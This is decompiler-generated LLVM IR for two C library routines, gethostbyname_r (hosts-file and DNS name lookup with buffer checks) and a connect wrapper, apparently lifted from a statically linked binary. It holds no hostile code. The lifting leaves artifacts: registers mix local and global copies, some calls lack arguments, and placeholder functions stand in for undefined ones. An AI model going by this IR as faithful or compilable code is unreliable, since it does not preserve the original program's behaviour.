define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %v0_1000a734 = load i32, i32* @lr, align 4
  store i32 %v0_1000a734, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r23, align 4
  %v3_1000a73c = icmp eq i32 %arg1, 0
  store i32 0, i32* @r31, align 4
  store i32 %arg5, i32* %r20.global-to-local, align 4
  store i32 %tmp, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* %r29.global-to-local, align 4
  store i32 %arg6, i32* @r24, align 4
  %v2_1000a75c = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_1000a75c, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  br i1 %v3_1000a73c, label %dec_label_pc_1000aa60, label %dec_label_pc_1000a768

dec_label_pc_1000a768:                            ; preds = %entry
  %v0_1000a768 = call i32 @__errno_location()
  store i32 %v0_1000a768, i32* %r3.global-to-local, align 4
  %v1_1000a770 = inttoptr i32 %v0_1000a768 to i32*
  %v2_1000a770 = load i32, i32* %v1_1000a770, align 4
  store i32 %v2_1000a770, i32* @r27, align 4
  store i32 %v0_1000a768, i32* %r28.global-to-local, align 4
  %v0_1000a778 = load i32, i32* @r31, align 4
  store i32 %v0_1000a778, i32* %v1_1000a770, align 4
  %v0_1000a77c = load i32, i32* %r26.global-to-local, align 4
  %v0_1000a780 = load i32, i32* @r23, align 4
  store i32 %v0_1000a780, i32* %r3.global-to-local, align 4
  %v0_1000a784 = load i32, i32* %r30.global-to-local, align 4
  %v0_1000a788 = load i32, i32* %r29.global-to-local, align 4
  %v0_1000a78c = load i32, i32* %r20.global-to-local, align 4
  %v0_1000a790 = load i32, i32* @r24, align 4
  store i32 268478360, i32* @lr, align 4
  %v7_1000a794 = call i32 @__get_hosts_byname_r(i32 %v0_1000a780, i32 2, i32 %v0_1000a77c, i32 %v0_1000a784, i32 %v0_1000a788, i32 %v0_1000a78c, i32 %v0_1000a790)
  store i32 %v7_1000a794, i32* %r3.global-to-local, align 4
  %v3_1000a798 = icmp eq i32 %v7_1000a794, 0
  br i1 %v3_1000a798, label %dec_label_pc_1000aa60, label %dec_label_pc_1000a7a0

dec_label_pc_1000a7a0:                            ; preds = %dec_label_pc_1000a768
  %v0_1000a7a0 = load i32, i32* @r24, align 4
  %v1_1000a7a0 = inttoptr i32 %v0_1000a7a0 to i32*
  %v2_1000a7a0 = load i32, i32* %v1_1000a7a0, align 4
  store i32 %v2_1000a7a0, i32* %r0.global-to-local, align 4
  %v3_1000a7a4 = icmp eq i32 %v2_1000a7a0, 1
  br i1 %v3_1000a7a4, label %dec_label_pc_1000a7c8, label %dec_label_pc_1000a7ac

dec_label_pc_1000a7ac:                            ; preds = %dec_label_pc_1000a7a0
  %v3_1000a7ac = icmp eq i32 %v2_1000a7a0, 4
  br i1 %v3_1000a7ac, label %dec_label_pc_1000a7c8, label %dec_label_pc_1000a7b4

dec_label_pc_1000a7b4:                            ; preds = %dec_label_pc_1000a7ac
  %v3_1000a7b4 = icmp eq i32 %v2_1000a7a0, -1
  br i1 %v3_1000a7b4, label %dec_label_pc_1000a7bc, label %dec_label_pc_1000aa60

dec_label_pc_1000a7bc:                            ; preds = %dec_label_pc_1000a7b4
  %v0_1000a7bc = load i32, i32* @r28, align 4
  %v1_1000a7bc = inttoptr i32 %v0_1000a7bc to i32*
  %v2_1000a7bc = load i32, i32* %v1_1000a7bc, align 4
  store i32 %v2_1000a7bc, i32* %r0.global-to-local, align 4
  %v3_1000a7c0 = icmp eq i32 %v2_1000a7bc, 2
  br i1 %v3_1000a7c0, label %dec_label_pc_1000a7c8, label %dec_label_pc_1000aa60

dec_label_pc_1000a7c8:                            ; preds = %dec_label_pc_1000a7bc, %dec_label_pc_1000a7ac, %dec_label_pc_1000a7a0
  %v0_1000a7c8 = load i32, i32* @r30, align 4
  %v1_1000a7c8 = sub i32 0, %v0_1000a7c8
  store i32 %v1_1000a7c8, i32* %r0.global-to-local, align 4
  %v0_1000a7cc = load i32, i32* @r27, align 4
  %v1_1000a7cc = load i32, i32* @r28, align 4
  %v2_1000a7cc = inttoptr i32 %v1_1000a7cc to i32*
  store i32 %v0_1000a7cc, i32* %v2_1000a7cc, align 4
  %v0_1000a7d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a7d0 = urem i32 %v0_1000a7d0, 4
  store i32 %v1_1000a7d0, i32* %r0.global-to-local, align 4
  %v3_1000a7d0 = icmp eq i32 %v1_1000a7d0, 0
  %v0_1000a7e8.pre = load i32, i32* @r29, align 4
  br i1 %v3_1000a7d0, label %dec_label_pc_1000a7e8, label %dec_label_pc_1000a7d8

dec_label_pc_1000a7d8:                            ; preds = %dec_label_pc_1000a7c8
  %v2_1000a7d8 = icmp ult i32 %v0_1000a7e8.pre, %v1_1000a7d0
  br i1 %v2_1000a7d8, label %dec_label_pc_1000aa5c, label %dec_label_pc_1000a7e0

dec_label_pc_1000a7e0:                            ; preds = %dec_label_pc_1000a7d8
  %v2_1000a7e0 = sub i32 %v0_1000a7e8.pre, %v1_1000a7d0
  store i32 %v2_1000a7e0, i32* @r29, align 4
  %v0_1000a7e4 = load i32, i32* @r30, align 4
  %v2_1000a7e4 = add i32 %v0_1000a7e4, %v1_1000a7d0
  store i32 %v2_1000a7e4, i32* @r30, align 4
  br label %dec_label_pc_1000a7e8

dec_label_pc_1000a7e8:                            ; preds = %dec_label_pc_1000a7c8, %dec_label_pc_1000a7e0
  %v0_1000a7e8 = phi i32 [ %v2_1000a7e0, %dec_label_pc_1000a7e0 ], [ %v0_1000a7e8.pre, %dec_label_pc_1000a7c8 ]
  %v1_1000a7f0 = load i32, i32* @r24, align 4
  %v2_1000a7f0 = inttoptr i32 %v1_1000a7f0 to i32*
  store i32 -1, i32* %v2_1000a7f0, align 4
  %tmp29 = icmp ult i32 %v0_1000a7e8, 4
  br i1 %tmp29, label %dec_label_pc_1000aa5c, label %dec_label_pc_1000a7f8

dec_label_pc_1000a7f8:                            ; preds = %dec_label_pc_1000a7e8
  %v0_1000a7f8 = load i32, i32* @r29, align 4
  %v1_1000a7f8 = add i32 %v0_1000a7f8, -4
  store i32 %v1_1000a7f8, i32* %r0.global-to-local, align 4
  %tmp30 = icmp ult i32 %v1_1000a7f8, 8
  br i1 %tmp30, label %dec_label_pc_1000aa5c, label %dec_label_pc_1000a804

dec_label_pc_1000a804:                            ; preds = %dec_label_pc_1000a7f8
  %v1_1000a804 = add i32 %v0_1000a7f8, -12
  store i32 %v1_1000a804, i32* %r0.global-to-local, align 4
  %v0_1000a808 = load i32, i32* @r30, align 4
  %v1_1000a808 = add i32 %v0_1000a808, 4
  store i32 %v1_1000a808, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  %v3_1000a814 = inttoptr i32 %v1_1000a808 to i32*
  store i32 %v0_1000a808, i32* %v3_1000a814, align 4
  %v0_1000a818 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000a818 = load i32, i32* %r25.global-to-local, align 4
  %v2_1000a818 = add i32 %v1_1000a818, 4
  %v3_1000a818 = inttoptr i32 %v2_1000a818 to i32*
  store i32 %v0_1000a818, i32* %v3_1000a818, align 4
  %tmp31 = icmp ult i32 %v1_1000a804, 32
  br i1 %tmp31, label %dec_label_pc_1000aa5c, label %dec_label_pc_1000a820

dec_label_pc_1000a820:                            ; preds = %dec_label_pc_1000a804
  %v0_1000a820 = load i32, i32* @r29, align 4
  %v1_1000a820 = add i32 %v0_1000a820, -44
  %tmp32 = icmp ult i32 %v1_1000a820, 256
  br i1 %tmp32, label %dec_label_pc_1000aa5c, label %dec_label_pc_1000a82c

dec_label_pc_1000a82c:                            ; preds = %dec_label_pc_1000a820
  %v0_1000a82c = load i32, i32* @r30, align 4
  %v1_1000a82c = add i32 %v0_1000a82c, 44
  store i32 %v1_1000a82c, i32* @r31, align 4
  %v0_1000a830 = load i32, i32* @r23, align 4
  store i32 %v0_1000a830, i32* @r4, align 4
  %v1_1000a838 = add i32 %v0_1000a82c, 12
  store i32 %v1_1000a838, i32* %r21.global-to-local, align 4
  store i32 %v1_1000a82c, i32* %r3.global-to-local, align 4
  store i32 268478532, i32* @lr, align 4
  %v3_1000a840 = call i32 @strncpy(i32 %v1_1000a82c, i32 %v0_1000a830, i32 %v1_1000a820)
  %v0_1000a844 = load i32, i32* @r31, align 4
  %v1_1000a844 = load i32, i32* @r30, align 4
  %v2_1000a844 = add i32 %v1_1000a844, 12
  %v3_1000a844 = inttoptr i32 %v2_1000a844 to i32*
  store i32 %v0_1000a844, i32* %v3_1000a844, align 4
  %v0_1000a848 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000a848 = load i32, i32* %r21.global-to-local, align 4
  %v2_1000a848 = add i32 %v1_1000a848, 4
  %v3_1000a848 = inttoptr i32 %v2_1000a848 to i32*
  store i32 %v0_1000a848, i32* %v3_1000a848, align 4
  %v0_1000a84c = load i32, i32* @r23, align 4
  store i32 %v0_1000a84c, i32* %r3.global-to-local, align 4
  %v0_1000a850 = load i32, i32* @r30, align 4
  store i32 %v0_1000a850, i32* @r4, align 4
  store i32 268478552, i32* @lr, align 4
  %v2_1000a854 = inttoptr i32 %v0_1000a84c to i8*
  %v3_1000a854 = call i32 @inet_aton(i8* %v2_1000a854)
  store i32 %v3_1000a854, i32* %r3.global-to-local, align 4
  store i32 %v3_1000a854, i32* %r22.global-to-local, align 4
  %v3_1000a858 = icmp eq i32 %v3_1000a854, 0
  br i1 %v3_1000a858, label %dec_label_pc_1000a88c, label %dec_label_pc_1000a860

dec_label_pc_1000a860:                            ; preds = %dec_label_pc_1000a82c
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000a868 = load i32, i32* @r26, align 4
  %v2_1000a868 = add i32 %v1_1000a868, 8
  %v3_1000a868 = inttoptr i32 %v2_1000a868 to i32*
  store i32 2, i32* %v3_1000a868, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1000a870 = load i32, i32* @r31, align 4
  %v1_1000a870 = load i32, i32* @r26, align 4
  %v2_1000a870 = inttoptr i32 %v1_1000a870 to i32*
  store i32 %v0_1000a870, i32* %v2_1000a870, align 4
  %v0_1000a874 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a874 = load i32, i32* @r26, align 4
  %v2_1000a874 = add i32 %v1_1000a874, 12
  %v3_1000a874 = inttoptr i32 %v2_1000a874 to i32*
  store i32 %v0_1000a874, i32* %v3_1000a874, align 4
  %v0_1000a878 = load i32, i32* %r25.global-to-local, align 4
  %v1_1000a878 = load i32, i32* @r26, align 4
  %v2_1000a878 = add i32 %v1_1000a878, 16
  %v3_1000a878 = inttoptr i32 %v2_1000a878 to i32*
  store i32 %v0_1000a878, i32* %v3_1000a878, align 4
  %v0_1000a87c = load i32, i32* %r21.global-to-local, align 4
  %v1_1000a87c = load i32, i32* @r26, align 4
  %v2_1000a87c = add i32 %v1_1000a87c, 4
  %v3_1000a87c = inttoptr i32 %v2_1000a87c to i32*
  store i32 %v0_1000a87c, i32* %v3_1000a87c, align 4
  %v0_1000a880 = load i32, i32* @r26, align 4
  %v1_1000a880 = load i32, i32* @r20, align 4
  %v2_1000a880 = inttoptr i32 %v1_1000a880 to i32*
  store i32 %v0_1000a880, i32* %v2_1000a880, align 4
  %v0_1000a884 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000a884 = load i32, i32* @r24, align 4
  %v2_1000a884 = inttoptr i32 %v1_1000a884 to i32*
  store i32 %v0_1000a884, i32* %v2_1000a884, align 4
  br label %dec_label_pc_1000aa60

dec_label_pc_1000a88c:                            ; preds = %dec_label_pc_1000a82c
  store i32 268566528, i32* %r29.global-to-local, align 4
  store i32 268478612, i32* @lr, align 4
  %v0_1000a890 = call i32 @__open_nameservers()
  store i32 ptrtoint (i32* @global_var_10023498.321 to i32), i32* %r29.global-to-local, align 4
  %v2_1000a898 = ptrtoint i32* %stack_var_-116 to i32
  store i32 %v2_1000a898, i32* %r28.global-to-local, align 4
  store i32 %v2_1000a898, i32* @r3, align 4
  %v0_1000a8ac = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_10023498.321 to i32), i32* %r3.global-to-local, align 4
  %v0_1000a8b4 = call i32 @__pthread_return_0()
  %v3_1000a8bc = load i32, i32* @global_var_1002357c.322, align 4
  store i32 %v3_1000a8bc, i32* %r29.global-to-local, align 4
  store i32 %v2_1000a898, i32* @r3, align 4
  %v0_1000a8c8 = call i32 @__pthread_return_void()
  %v0_1000a8d0 = load i32, i32* @r23, align 4
  store i32 %v0_1000a8d0, i32* %r3.global-to-local, align 4
  %v2_1000a8e0 = ptrtoint i32* %stack_var_-120 to i32
  %v2_1000a8e4 = ptrtoint i32* %stack_var_-100 to i32
  %v0_1000a8e8 = load i32, i32* %r22.global-to-local, align 4
  store i32 268478712, i32* @lr, align 4
  %v6_1000a8f4 = inttoptr i32 %v0_1000a8d0 to i8*
  %v7_1000a8f4 = call i32 @__dns_lookup(i8* %v6_1000a8f4, i32 1, i32 %v3_1000a8bc, i32 ptrtoint (i32* @global_var_10029878.323 to i32), i32 %v2_1000a8e0, i32 %v2_1000a8e4)
  store i32 %v7_1000a8f4, i32* %r3.global-to-local, align 4
  %v1_1000a8f8 = icmp slt i32 %v7_1000a8f4, 0
  br i1 %v1_1000a8f8, label %dec_label_pc_1000aa40, label %dec_label_pc_1000a900

dec_label_pc_1000a900:                            ; preds = %dec_label_pc_1000a88c
  store i32 %tmp19, i32* %r11.global-to-local, align 4
  %v1_1000a908 = add i32 %tmp19, 4
  %v2_1000a90c = mul i32 %v0_1000a8e8, %v1_1000a908
  %v1_1000a910 = add i32 %v2_1000a90c, 256
  %v1_1000a914 = load i32, i32* @r27, align 4
  %v3_1000a914 = icmp ugt i32 %v1_1000a910, %v1_1000a914
  br i1 %v3_1000a914, label %dec_label_pc_1000a91c, label %dec_label_pc_1000a938

dec_label_pc_1000a91c:                            ; preds = %dec_label_pc_1000a900
  %v3_1000a91c = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000a91c, i32* @r3, align 4
  store i32 268478756, i32* @lr, align 4
  %v0_1000a920 = call i32 @free()
  %v3_1000a924 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000a924, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a92c.324 to i32), i32* @lr, align 4
  %v0_1000a928 = call i32 @free()
  store i32 34, i32* %r3.global-to-local, align 4
  %v0_1000a930 = load i32, i32* @r19, align 4
  %v1_1000a930 = load i32, i32* @r24, align 4
  %v2_1000a930 = inttoptr i32 %v1_1000a930 to i32*
  store i32 %v0_1000a930, i32* %v2_1000a930, align 4
  br label %dec_label_pc_1000aa60

dec_label_pc_1000a938:                            ; preds = %dec_label_pc_1000a900
  %v3_1000a938 = icmp eq i32 %v0_1000a8e8, 0
  br i1 %v3_1000a938, label %dec_label_pc_1000a938.dec_label_pc_1000a9dc_crit_edge, label %dec_label_pc_1000a940

dec_label_pc_1000a938.dec_label_pc_1000a9dc_crit_edge: ; preds = %dec_label_pc_1000a938
  %v0_1000a9e4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000a9dc

dec_label_pc_1000a940:                            ; preds = %dec_label_pc_1000a938
  %v2_1000a940 = mul i32 %v0_1000a8e8, %tmp19
  store i32 %v2_1000a940, i32* @r5, align 4
  %v0_1000a944 = load i32, i32* @r30, align 4
  %v1_1000a944 = add i32 %v0_1000a944, 36
  store i32 %v1_1000a944, i32* %r3.global-to-local, align 4
  %v0_1000a948 = load i32, i32* @r31, align 4
  store i32 268478800, i32* @lr, align 4
  %v2_1000a94c = call i32 @memmove(i32 %v1_1000a944, i32 %v0_1000a948)
  store i32 %v2_1000a94c, i32* %r3.global-to-local, align 4
  store i32 %v2_1000a940, i32* %r0.global-to-local, align 4
  %v0_1000a95c = load i32, i32* @r30, align 4
  %v1_1000a95c = load i32, i32* @r31, align 4
  %v3_1000a95c = add i32 %v1_1000a95c, %v2_1000a940
  %v4_1000a95c = inttoptr i32 %v3_1000a95c to i32*
  store i32 %v0_1000a95c, i32* %v4_1000a95c, align 4
  %v0_1000a960 = load i32, i32* @r31, align 4
  %v1_1000a960 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000a960 = add i32 %v1_1000a960, %v0_1000a960
  store i32 %v2_1000a960, i32* @r25, align 4
  %v1_1000a968 = add i32 %v0_1000a8e8, -1
  store i32 %v1_1000a968, i32* %r11.global-to-local, align 4
  %v1_1000a96c = add i32 %v0_1000a8e8, 1
  %v2_1000a970 = icmp sgt i32 %v1_1000a968, -1
  store i32 %v1_1000a96c, i32* %ctr.global-to-local, align 4
  br i1 %v2_1000a970, label %dec_label_pc_1000a9a0.preheader, label %dec_label_pc_1000a97c

dec_label_pc_1000a97c:                            ; preds = %dec_label_pc_1000a940
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000a9a0.preheader

dec_label_pc_1000a9a0.preheader:                  ; preds = %dec_label_pc_1000a97c, %dec_label_pc_1000a940
  %v0_1000a9a86 = phi i32 [ 1, %dec_label_pc_1000a97c ], [ %v1_1000a96c, %dec_label_pc_1000a940 ]
  %v1_1000a9a03 = mul i32 %v1_1000a968, 4
  store i32 %v1_1000a9a03, i32* %r0.global-to-local, align 4
  %v2_1000a9a45 = add i32 %v2_1000a960, %v1_1000a9a03
  %v1_1000a9a87 = add i32 %v0_1000a9a86, -1
  store i32 %v1_1000a9a87, i32* %ctr.global-to-local, align 4
  %v2_1000a9a88 = icmp eq i32 %v1_1000a9a87, 0
  br i1 %v2_1000a9a88, label %dec_label_pc_1000a9ac, label %dec_label_pc_1000a988

dec_label_pc_1000a988:                            ; preds = %dec_label_pc_1000a9a0.preheader, %dec_label_pc_1000a988.dec_label_pc_1000a988_crit_edge
  %v1_1000a99c = phi i32 [ %v2_1000a9a4, %dec_label_pc_1000a988.dec_label_pc_1000a988_crit_edge ], [ %v2_1000a9a45, %dec_label_pc_1000a9a0.preheader ]
  %v0_1000a994 = phi i32 [ %v0_1000a994.pre, %dec_label_pc_1000a988.dec_label_pc_1000a988_crit_edge ], [ %v0_1000a960, %dec_label_pc_1000a9a0.preheader ]
  %v0_1000a98c = phi i32 [ %v0_1000a9a0, %dec_label_pc_1000a988.dec_label_pc_1000a988_crit_edge ], [ %v1_1000a968, %dec_label_pc_1000a9a0.preheader ]
  %v2_1000a98c = mul i32 %v0_1000a98c, %tmp19
  %v1_1000a990 = add i32 %v0_1000a98c, -1
  store i32 %v1_1000a990, i32* %r11.global-to-local, align 4
  %v2_1000a994 = add i32 %v0_1000a994, -8
  %v1_1000a998 = add i32 %v2_1000a994, %v2_1000a98c
  %v2_1000a99c = add i32 %v1_1000a99c, 4
  %v3_1000a99c = inttoptr i32 %v2_1000a99c to i32*
  store i32 %v1_1000a998, i32* %v3_1000a99c, align 4
  %v0_1000a9a0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a9a0 = mul i32 %v0_1000a9a0, 4
  store i32 %v1_1000a9a0, i32* %r0.global-to-local, align 4
  %v1_1000a9a4 = load i32, i32* @r25, align 4
  %v0_1000a9a8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a9a8 = add i32 %v0_1000a9a8, -1
  store i32 %v1_1000a9a8, i32* %ctr.global-to-local, align 4
  %v2_1000a9a8 = icmp eq i32 %v1_1000a9a8, 0
  br i1 %v2_1000a9a8, label %dec_label_pc_1000a9ac, label %dec_label_pc_1000a988.dec_label_pc_1000a988_crit_edge

dec_label_pc_1000a988.dec_label_pc_1000a988_crit_edge: ; preds = %dec_label_pc_1000a988
  %v2_1000a9a4 = add i32 %v1_1000a9a4, %v1_1000a9a0
  %v0_1000a994.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000a988

dec_label_pc_1000a9ac:                            ; preds = %dec_label_pc_1000a988, %dec_label_pc_1000a9a0.preheader
  %v1_1000a9b8 = phi i32 [ %v2_1000a960, %dec_label_pc_1000a9a0.preheader ], [ %v1_1000a9a4, %dec_label_pc_1000a988 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000a9b4 = mul i32 %v0_1000a8e8, 4
  %v2_1000a9b8 = add i32 %v1_1000a9b4, 4
  %v2_1000a9bc = add i32 %v2_1000a9b8, %v1_1000a9b8
  %v3_1000a9bc = inttoptr i32 %v2_1000a9bc to i32*
  store i32 0, i32* %v3_1000a9bc, align 4
  %v0_1000a9c8 = load i32, i32* @r25, align 4
  %v2_1000a9c8 = add i32 %v0_1000a9c8, %v1_1000a9b4
  store i32 %v2_1000a9c8, i32* %r11.global-to-local, align 4
  %v1_1000a9cc = load i32, i32* @r31, align 4
  %v2_1000a9cc = sub i32 %v1_1000a9cc, %v2_1000a9c8
  %v1_1000a9d0 = add i32 %v2_1000a9c8, 8
  store i32 %v1_1000a9d0, i32* @r31, align 4
  %v0_1000a9d4 = load i32, i32* @r27, align 4
  %v2_1000a9d4 = add i32 %v0_1000a9d4, %v2_1000a9cc
  %v1_1000a9d8 = add i32 %v2_1000a9d4, -8
  br label %dec_label_pc_1000a9dc

dec_label_pc_1000a9dc:                            ; preds = %dec_label_pc_1000a938.dec_label_pc_1000a9dc_crit_edge, %dec_label_pc_1000a9ac
  %v0_1000a9e4 = phi i32 [ %v0_1000a9e4.pre, %dec_label_pc_1000a938.dec_label_pc_1000a9dc_crit_edge ], [ %v1_1000a9d0, %dec_label_pc_1000a9ac ]
  %v0_1000a9e0 = phi i32 [ %v1_1000a914, %dec_label_pc_1000a938.dec_label_pc_1000a9dc_crit_edge ], [ %v1_1000a9d8, %dec_label_pc_1000a9ac ]
  %v3_1000a9dc = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000a9dc, i32* @r4, align 4
  store i32 %v0_1000a9e4, i32* %r3.global-to-local, align 4
  store i32 268478956, i32* @lr, align 4
  %v3_1000a9e8 = call i32 @strncpy(i32 %v0_1000a9e4, i32 %v3_1000a9dc, i32 %v0_1000a9e0)
  %v3_1000a9ec = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000a9ec, i32* @r3, align 4
  store i32 268478964, i32* @lr, align 4
  %v0_1000a9f0 = call i32 @free()
  store i32 %v0_1000a9f0, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* %r0.global-to-local, align 4
  %v3_1000a9f8 = icmp eq i32 %tmp18, 1
  br i1 %v3_1000a9f8, label %dec_label_pc_1000aa00, label %dec_label_pc_1000aa48

dec_label_pc_1000aa00:                            ; preds = %dec_label_pc_1000a9dc
  store i32 4, i32* @r5, align 4
  %v0_1000aa08 = load i32, i32* @r30, align 4
  store i32 %v0_1000aa08, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000aa10.325 to i32), i32* @lr, align 4
  %v0_1000aa0c = call i32 @memcpy()
  %v1_1000aa14 = load i32, i32* @r26, align 4
  %v2_1000aa14 = add i32 %v1_1000aa14, 8
  %v3_1000aa14 = inttoptr i32 %v2_1000aa14 to i32*
  store i32 2, i32* %v3_1000aa14, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1000aa1c = load i32, i32* @r26, align 4
  %v2_1000aa1c = add i32 %v1_1000aa1c, 12
  %v3_1000aa1c = inttoptr i32 %v2_1000aa1c to i32*
  store i32 4, i32* %v3_1000aa1c, align 4
  %v0_1000aa20 = load i32, i32* @r31, align 4
  %v1_1000aa20 = load i32, i32* @r26, align 4
  %v2_1000aa20 = inttoptr i32 %v1_1000aa20 to i32*
  store i32 %v0_1000aa20, i32* %v2_1000aa20, align 4
  %v0_1000aa24 = load i32, i32* @r25, align 4
  %v1_1000aa24 = load i32, i32* @r26, align 4
  %v2_1000aa24 = add i32 %v1_1000aa24, 16
  %v3_1000aa24 = inttoptr i32 %v2_1000aa24 to i32*
  store i32 %v0_1000aa24, i32* %v3_1000aa24, align 4
  %v0_1000aa28 = load i32, i32* @r21, align 4
  %v1_1000aa28 = load i32, i32* @r26, align 4
  %v2_1000aa28 = add i32 %v1_1000aa28, 4
  %v3_1000aa28 = inttoptr i32 %v2_1000aa28 to i32*
  store i32 %v0_1000aa28, i32* %v3_1000aa28, align 4
  %v3_1000aa2c = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000aa2c, i32* @r3, align 4
  store i32 268479028, i32* @lr, align 4
  %v0_1000aa30 = call i32 @free()
  store i32 %v0_1000aa30, i32* %r3.global-to-local, align 4
  %v0_1000aa34 = load i32, i32* @r26, align 4
  %v1_1000aa34 = load i32, i32* @r20, align 4
  %v2_1000aa34 = inttoptr i32 %v1_1000aa34 to i32*
  store i32 %v0_1000aa34, i32* %v2_1000aa34, align 4
  br label %dec_label_pc_1000aa40

dec_label_pc_1000aa40:                            ; preds = %dec_label_pc_1000aa48, %dec_label_pc_1000a88c, %dec_label_pc_1000aa00
  %storemerge1 = phi i32 [ 0, %dec_label_pc_1000aa00 ], [ 2, %dec_label_pc_1000a88c ], [ 2, %dec_label_pc_1000aa48 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_1000aa00 ], [ 1, %dec_label_pc_1000a88c ], [ 1, %dec_label_pc_1000aa48 ]
  store i32 %storemerge1, i32* %r3.global-to-local, align 4
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_1000aa40 = load i32, i32* @r24, align 4
  %v2_1000aa40 = inttoptr i32 %v1_1000aa40 to i32*
  store i32 %storemerge, i32* %v2_1000aa40, align 4
  br label %dec_label_pc_1000aa60

dec_label_pc_1000aa48:                            ; preds = %dec_label_pc_1000a9dc
  %v3_1000aa48 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000aa48, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000aa50.326 to i32), i32* @lr, align 4
  %v0_1000aa4c = call i32 @free()
  store i32 %v0_1000aa4c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000aa40

dec_label_pc_1000aa5c:                            ; preds = %dec_label_pc_1000a820, %dec_label_pc_1000a804, %dec_label_pc_1000a7f8, %dec_label_pc_1000a7e8, %dec_label_pc_1000a7d8
  store i32 34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000aa60

dec_label_pc_1000aa60:                            ; preds = %dec_label_pc_1000a7bc, %dec_label_pc_1000a7b4, %dec_label_pc_1000a768, %entry, %dec_label_pc_1000aa40, %dec_label_pc_1000a91c, %dec_label_pc_1000a860, %dec_label_pc_1000aa5c
  store i32 %v0_1000a734, i32* %r0.global-to-local, align 4
  %v0_1000aa70 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000aa70

; uselistorder directives
  uselistorder i32 %v0_1000a9e4, { 1, 0 }
  uselistorder i32 %v1_1000a9b4, { 1, 0 }
  uselistorder i32 %v1_1000a9a8, { 1, 0 }
  uselistorder i32 %v1_1000a9a0, { 1, 0 }
  uselistorder i32 %v0_1000a98c, { 1, 0 }
  uselistorder i32 %v1_1000a9a03, { 1, 0 }
  uselistorder i32 %v1_1000a968, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000a960, { 1, 0, 2 }
  uselistorder i32 %v0_1000a8e8, { 0, 5, 4, 1, 3, 2 }
  uselistorder i32 %v1_1000a82c, { 1, 0, 2 }
  uselistorder i32 %v0_1000a7e8.pre, { 0, 2, 1 }
  uselistorder i32 %v1_1000a7d0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp19, { 0, 1, 3, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 20, 21, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1 }
  uselistorder i32* %r0.global-to-local, { 18, 0, 1, 2, 3, 4, 19, 7, 5, 6, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder label %dec_label_pc_1000aa60, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000aa40, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000a9dc, { 1, 0 }
  uselistorder label %dec_label_pc_1000a988, { 1, 0 }
  uselistorder label %dec_label_pc_1000a7e8, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000aa88 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268479128, i32* @lr, align 4
  %v2_1000aa94 = call i32 @__socketcall(i32 3, i32 %v2_1000aa88)
  ret i32 %v2_1000aa94

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

